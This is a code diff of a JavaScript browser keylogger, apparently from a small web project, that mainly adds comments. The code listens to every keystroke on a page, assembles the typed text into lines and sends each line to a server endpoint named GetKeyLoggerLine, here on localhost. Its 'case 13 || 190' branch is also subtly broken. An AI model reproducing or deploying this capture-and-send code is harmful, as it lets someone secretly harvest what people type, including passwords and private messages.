@@ -19,20 +19,24 @@
         var sentence = "";
         var line = "";
 
+        //EventListener
         document.addEventListener("keydown", function (e) {
 
             var characterCode = e.which || e.keyCode;
             var characterValue = String.fromCharCode(characterCode);
 
+            //write character in console
             console.log("char: " + characterValue);
 
             switch (characterCode) {
                 case 32:
+                    //next word
                     sentence += " " + word;
                     console.log("word: " + word);
                     word = "";
                     break;
                 case 13 || 190:
+                    //next sentence
                     line += sentence + word;
 
                     console.log("line: " + line);
@@ -58,7 +62,6 @@
             if (line.length > 0) {
                 const httpRequest = new XMLHttpRequest();
 
-                //gibt manchmal eine Fehlermeldung, hat beim testen aber trotzdem funktioniert
                 httpRequest.open("GET", "http://localhost:49815/Home/GetKeyLoggerLine?line=" + line);
                 httpRequest.send();
             }
